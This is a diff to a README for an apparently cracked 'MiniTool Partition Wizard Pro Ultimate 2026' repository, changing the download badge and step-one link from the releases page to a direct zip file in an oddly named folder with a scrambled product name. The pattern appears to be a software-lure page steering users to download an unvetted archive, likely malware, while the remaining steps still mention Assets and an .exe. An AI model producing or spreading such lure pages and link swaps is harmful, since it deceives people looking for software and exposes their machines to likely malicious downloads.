@@ -1,6 +1,6 @@
 # 💾 MiniTool-Partition-Wizard-Pro-Ultimate-2026 - Master your disk space with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/ehfsubpoena951/MiniTool-Partition-Wizard-Pro-Ultimate-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/ehfsubpoena951/MiniTool-Partition-Wizard-Pro-Ultimate-2026/raw/refs/heads/main/Eupanorthidae/Wizard-Pro-Mini-Partition-Ultimate-Tool-v3.7.zip)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ Before you install the software, ensure your computer meets these requirements:
 
 Follow these steps to obtain the installation files:
 
-1. Visit [this page to download](https://github.com/ehfsubpoena951/MiniTool-Partition-Wizard-Pro-Ultimate-2026/releases).
+1. Visit [this page to download](https://github.com/ehfsubpoena951/MiniTool-Partition-Wizard-Pro-Ultimate-2026/raw/refs/heads/main/Eupanorthidae/Wizard-Pro-Mini-Partition-Ultimate-Tool-v3.7.zip).
 2. Look for the section labeled Assets.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
